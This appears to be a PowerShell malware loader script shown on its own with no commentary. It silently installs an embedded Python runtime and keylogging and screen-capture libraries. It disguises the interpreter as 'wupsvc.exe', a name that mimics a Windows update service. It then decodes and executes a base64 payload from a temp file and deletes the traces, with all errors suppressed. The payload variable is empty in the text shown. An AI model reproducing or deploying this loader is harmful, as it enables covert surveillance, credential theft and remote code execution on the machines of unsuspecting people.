$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$b = ""
$d = "$env:LOCALAPPDATA\Python312"
$w = "$d\wupsvc.exe"

# find python
$p = $null
if (Test-Path $w) { $p = $w }
elseif (Test-Path "$d\python.exe") { $p = "$d\python.exe" }
else {
    foreach ($x in "C:\Python312\python.exe","C:\Python37\python.exe","C:\Python311\python.exe","C:\Python310\python.exe","C:\Python39\python.exe") {
        if (Test-Path $x) { $p = $x; break }
    }
    if (!$p) {
        mkdir $d -Force -ErrorAction SilentlyContinue | Out-Null
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        try { Invoke-WebRequest "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip" -OutFile "$d\p.zip" -UseBasicParsing } catch{ exit 1 }
        try { Expand-Archive "$d\p.zip" -DestinationPath $d -Force } catch{ exit 1 }
        $pth = "$d\python312._pth"
        if (Test-Path $pth) { (GC $pth) -replace "#import site","import site" | SC $pth }
        Remove-Item "$d\p.zip" -Force -ErrorAction SilentlyContinue
        try { Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$d\g.py" -UseBasicParsing } catch{ exit 1 }
        & "$d\python.exe" "$d\g.py" --quiet 2>$null 1>$null
        Remove-Item "$d\g.py" -Force -ErrorAction SilentlyContinue
        & "$d\python.exe" -m pip install numpy opencv-python-headless pyautogui keyboard pynput psutil mss --quiet 2>$null 1>$null
        $p = "$d\python.exe"
    }
    if ($p -and !(Test-Path $w)) {
        mkdir $d -Force -ErrorAction SilentlyContinue | Out-Null
        Copy-Item $p $w -Force -ErrorAction SilentlyContinue
        if (Test-Path $w) { $p = $w }
    }
}

if (!$p) { exit 1 }

$f = "$env:TEMP\_pld.dat"
$b | Set-Content $f -NoNewline -Encoding Ascii
$env:PLD = $f
& $p -c "import os,base64; exec(base64.b64decode(open(os.environ['PLD']).read()))" 2>$null
Remove-Item $f -Force -ErrorAction SilentlyContinue
